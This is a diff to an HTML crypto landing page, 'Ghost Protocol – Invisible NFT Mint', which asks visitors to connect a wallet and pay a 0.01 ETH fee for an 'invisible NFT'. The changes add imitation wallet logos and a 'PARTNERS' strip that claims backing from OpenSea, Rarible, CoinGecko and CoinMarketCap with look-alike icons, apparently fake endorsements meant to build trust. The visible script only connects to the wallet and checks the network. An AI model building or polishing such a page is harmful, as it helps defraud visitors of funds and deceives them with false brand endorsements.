@@ -4,6 +4,8 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Ghost Protocol – Invisible NFT Mint</title>
+  <!-- FAVICON (HAYALET) -->
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>👻</text></svg>">
   <style>
     /* RESET */
     * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -18,7 +20,7 @@
       padding: 20px;
     }
     .container {
-      max-width: 720px;
+      max-width: 760px;
       width: 100%;
       background: #111;
       padding: 40px 30px;
@@ -86,13 +88,18 @@
       transition: 0.2s;
       display: inline-flex;
       align-items: center;
-      gap: 6px;
+      gap: 8px;
     }
     .btn:hover {
       background: #2a2a2a;
       border-color: #00ccff;
       color: #fff;
       transform: scale(1.02);
+    }
+    .btn svg {
+      width: 20px;
+      height: 20px;
+      flex-shrink: 0;
     }
     .btn-primary {
       background: #00ccff;
@@ -200,6 +207,37 @@
     .hidden {
       display: none;
     }
+    /* PARTNER LOGOLARI */
+    .partners {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      align-items: center;
+      gap: 20px 30px;
+      margin: 20px 0 10px 0;
+      padding: 12px;
+      background: #0a0a0a;
+      border-radius: 40px;
+      border: 1px solid #1a1a1a;
+    }
+    .partner {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      color: #666;
+      font-size: 12px;
+      font-weight: 500;
+      letter-spacing: 0.3px;
+    }
+    .partner svg {
+      width: 18px;
+      height: 18px;
+      filter: grayscale(1) brightness(2);
+      opacity: 0.6;
+    }
+    .partner span {
+      color: #555;
+    }
   </style>
 </head>
 <body>
@@ -217,13 +255,29 @@
     <strong>⛽ Gas Fee:</strong> 0.01 ETH (Ethereum Mainnet) &nbsp;•&nbsp; <span style="color:#00ff88;">NFT is free</span>
   </div>
 
-  <!-- CÜZDAN BUTONLARI -->
+  <!-- CÜZDAN BUTONLARI (GERÇEK LOGOLARLA) -->
   <p style="color:#aaa; font-size:14px; margin-bottom:4px;">Choose your wallet:</p>
   <div class="btn-group">
-    <button class="btn" onclick="connectWallet('MetaMask')">🦊 MetaMask</button>
-    <button class="btn" onclick="connectWallet('Trust Wallet')">📱 Trust Wallet</button>
-    <button class="btn" onclick="connectWallet('Coinbase Wallet')">🟣 Coinbase</button>
-    <button class="btn" onclick="connectWallet('Rabby')">🟠 Rabby</button>
+    <!-- MetaMask -->
+    <button class="btn" onclick="connectWallet('MetaMask')">
+      <svg viewBox="0 0 128 128" fill="none"><rect width="128" height="128" rx="20" fill="#E2761B"/><path d="M106 34L68 60L74 42L106 34Z" fill="#E2761B"/><path d="M22 34L59 60L54 42L22 34Z" fill="#E2761B"/><path d="M34 72L41 83L25 88L22 72L34 72Z" fill="#E2761B"/><path d="M94 72L87 83L103 88L106 72L94 72Z" fill="#E2761B"/><path d="M41 83L47 96L36 106L34 88L41 83Z" fill="#E2761B"/><path d="M87 83L81 96L92 106L94 88L87 83Z" fill="#E2761B"/><path d="M47 96L52 89L67 93L54 106L47 96Z" fill="#E2761B"/><path d="M81 96L76 89L61 93L74 106L81 96Z" fill="#E2761B"/><path d="M67 93L63 84L56 88L52 89L47 96L52 93L63 93L74 93L81 96L76 89L72 88L65 84L67 93Z" fill="#E2761B"/><path d="M65 84L63 89L52 93L63 93L65 84Z" fill="#E2761B"/><path d="M63 84L65 89L76 93L65 93L63 84Z" fill="#E2761B"/><path d="M76 89L72 88L68 91L67 93L76 89Z" fill="#E2761B"/><path d="M52 89L56 88L60 91L61 93L52 89Z" fill="#E2761B"/><path d="M61 93L56 91L54 96L52 93L61 93Z" fill="#E2761B"/><path d="M67 93L72 91L74 96L67 93Z" fill="#E2761B"/><path d="M74 96L72 89L68 84L65 89L63 84L61 96L61 93L63 93L65 93L67 93L74 93L74 96Z" fill="#E2761B"/><path d="M54 96L52 93L56 93L54 96Z" fill="#E2761B"/><path d="M74 96L74 93L76 93L74 96Z" fill="#E2761B"/></svg>
+      MetaMask
+    </button>
+    <!-- Trust Wallet -->
+    <button class="btn" onclick="connectWallet('Trust Wallet')">
+      <svg viewBox="0 0 128 128" fill="none"><rect width="128" height="128" rx="20" fill="#3375BB"/><path d="M64 28C64 28 42 44 42 64C42 84 64 100 64 100C64 100 86 84 86 64C86 44 64 28 64 28Z" fill="white"/><path d="M64 36C64 36 50 48 50 62C50 76 64 88 64 88C64 88 78 76 78 62C78 48 64 36 64 36Z" fill="#3375BB"/></svg>
+      Trust Wallet
+    </button>
+    <!-- Coinbase Wallet -->
+    <button class="btn" onclick="connectWallet('Coinbase Wallet')">
+      <svg viewBox="0 0 128 128" fill="none"><rect width="128" height="128" rx="20" fill="#0052FF"/><path d="M64 28C44.1 28 28 44.1 28 64C28 83.9 44.1 100 64 100C83.9 100 100 83.9 100 64C100 44.1 83.9 28 64 28Z" fill="#0052FF"/><path d="M64 34C47.4 34 34 47.4 34 64C34 80.6 47.4 94 64 94C80.6 94 94 80.6 94 64C94 47.4 80.6 34 64 34Z" fill="white"/><path d="M64 46C54.1 46 46 54.1 46 64C46 73.9 54.1 82 64 82C73.9 82 82 73.9 82 64C82 54.1 73.9 46 64 46Z" fill="#0052FF"/></svg>
+      Coinbase
+    </button>
+    <!-- Rabby -->
+    <button class="btn" onclick="connectWallet('Rabby')">
+      <svg viewBox="0 0 128 128" fill="none"><rect width="128" height="128" rx="20" fill="#FF7A2F"/><path d="M64 28C44.1 28 28 44.1 28 64C28 83.9 44.1 100 64 100C83.9 100 100 83.9 100 64C100 44.1 83.9 28 64 28Z" fill="#FF7A2F"/><path d="M64 38C49.6 38 38 49.6 38 64C38 78.4 49.6 90 64 90C78.4 90 90 78.4 90 64C90 49.6 78.4 38 64 38Z" fill="white"/><path d="M64 52C57.4 52 52 57.4 52 64C52 70.6 57.4 76 64 76C70.6 76 76 70.6 76 64C76 57.4 70.6 52 64 52Z" fill="#FF7A2F"/></svg>
+      Rabby
+    </button>
     <button class="btn" onclick="connectWallet('Web3')">🔗 Other</button>
   </div>
 
@@ -241,6 +295,26 @@
     <div class="step"><span class="step-num">1</span> Connect your wallet (MetaMask, Trust, etc.)</div>
     <div class="step"><span class="step-num">2</span> Pay the gas fee (0.01 ETH)</div>
     <div class="step"><span class="step-num">3</span> Your invisible NFT is minted to your wallet</div>
+  </div>
+
+  <!-- DESTEKLEYENLER (PARTNERS) -->
+  <div class="partners">
+    <div class="partner">
+      <svg viewBox="0 0 128 128"><rect width="128" height="128" rx="16" fill="#2081E2"/><path d="M64 28L36 42V68L64 82L92 68V42L64 28Z" fill="white"/><path d="M64 28L36 42V68L64 82L92 68V42L64 28Z" fill="white"/><path d="M64 42L50 50V66L64 74L78 66V50L64 42Z" fill="#2081E2"/></svg>
+      <span>OpenSea</span>
+    </div>
+    <div class="partner">
+      <svg viewBox="0 0 128 128"><rect width="128" height="128" rx="16" fill="#F5B5B5"/><path d="M64 28C44.1 28 28 44.1 28 64C28 83.9 44.1 100 64 100C83.9 100 100 83.9 100 64C100 44.1 83.9 28 64 28Z" fill="#F5B5B5"/><path d="M64 38C49.6 38 38 49.6 38 64C38 78.4 49.6 90 64 90C78.4 90 90 78.4 90 64C90 49.6 78.4 38 64 38Z" fill="white"/><path d="M64 46C54.1 46 46 54.1 46 64C46 73.9 54.1 82 64 82C73.9 82 82 73.9 82 64C82 54.1 73.9 46 64 46Z" fill="#F5B5B5"/></svg>
+      <span>Rarible</span>
+    </div>
+    <div class="partner">
+      <svg viewBox="0 0 128 128"><rect width="128" height="128" rx="16" fill="#FF6600"/><path d="M64 28C44.1 28 28 44.1 28 64C28 83.9 44.1 100 64 100C83.9 100 100 83.9 100 64C100 44.1 83.9 28 64 28Z" fill="#FF6600"/><path d="M64 38C49.6 38 38 49.6 38 64C38 78.4 49.6 90 64 90C78.4 90 90 78.4 90 64C90 49.6 78.4 38 64 38Z" fill="white"/><path d="M64 52C57.4 52 52 57.4 52 64C52 70.6 57.4 76 64 76C70.6 76 76 70.6 76 64C76 57.4 70.6 52 64 52Z" fill="#FF6600"/></svg>
+      <span>CoinGecko</span>
+    </div>
+    <div class="partner">
+      <svg viewBox="0 0 128 128"><rect width="128" height="128" rx="16" fill="#0D0D0D"/><path d="M64 28C44.1 28 28 44.1 28 64C28 83.9 44.1 100 64 100C83.9 100 100 83.9 100 64C100 44.1 83.9 28 64 28Z" fill="#0D0D0D"/><path d="M64 38C49.6 38 38 49.6 38 64C38 78.4 49.6 90 64 90C78.4 90 90 78.4 90 64C90 49.6 78.4 38 64 38Z" fill="#2B2B2B"/><path d="M64 46C54.1 46 46 54.1 46 64C46 73.9 54.1 82 64 82C73.9 82 82 73.9 82 64C82 54.1 73.9 46 64 46Z" fill="#0D0D0D"/><path d="M64 54C58.5 54 54 58.5 54 64C54 69.5 58.5 74 64 74C69.5 74 74 69.5 74 64C74 58.5 69.5 54 64 54Z" fill="#2B2B2B"/></svg>
+      <span>CoinMarketCap</span>
+    </div>
   </div>
 
   <!-- FOOTER -->
@@ -271,11 +345,9 @@
           alert('⚠️ Please switch to Ethereum Mainnet!');
           return;
         }
-        // Göster
         document.getElementById('walletAddress').innerText = userAddress.slice(0,10) + '...' + userAddress.slice(-6);
         document.getElementById('walletDisplay').classList.remove('hidden');
         document.getElementById('mintArea').classList.remove('hidden');
-        // Butonları pasifleştir (bağlandıktan sonra tekrar bağlanmaya gerek yok)
         document.querySelectorAll('.btn-group .btn').forEach(b => b.disabled = true);
       } catch (e) {
         alert('❌ Connection failed: ' + e.message);
